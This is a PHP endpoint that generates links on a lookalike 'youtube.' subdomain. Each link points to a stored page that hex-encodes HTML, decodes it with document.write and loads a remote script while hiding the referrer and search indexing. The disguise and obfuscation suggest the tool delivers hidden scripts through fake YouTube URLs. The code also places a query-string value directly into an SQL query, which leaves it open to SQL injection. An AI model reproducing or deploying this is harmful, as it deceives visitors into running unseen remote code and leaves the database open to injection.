<?php
header('Content-type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: ');
require_once "./random_string.php";
require_once "./BaseDatosMySql.php";
$cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
$script = trim($_GET['script']) ? $_GET['script'] : null;




$getcottorra=$pdoMySql->prepare("SELECT cottorra FROM cottorras WHERE  id='".$_GET['cottorra']."'");
$getcottorra->execute();
$info_cottorra=$getcottorra->fetchAll(PDO::FETCH_ASSOC);
foreach ($info_cottorra as $cottorraextraida) {
}


if(isset($script)) {
$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];
$PROTOCOLO  =  "https://";
	
	
$contentHTML = '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
</body>
</html>';

$contentHTMLEXTRAIDO = $contentHTML;	
$decode =  utf8_decode($contentHTMLEXTRAIDO);
$hex = bin2hex($decode);	
$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	

file_put_contents("youtube/links". "/" .$NAMEFILE, $script);	
	
$response = array(
 "url"=>$cottorraextraida['cottorra']." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
);
echo json_encode($response);   	
	
} 
?>
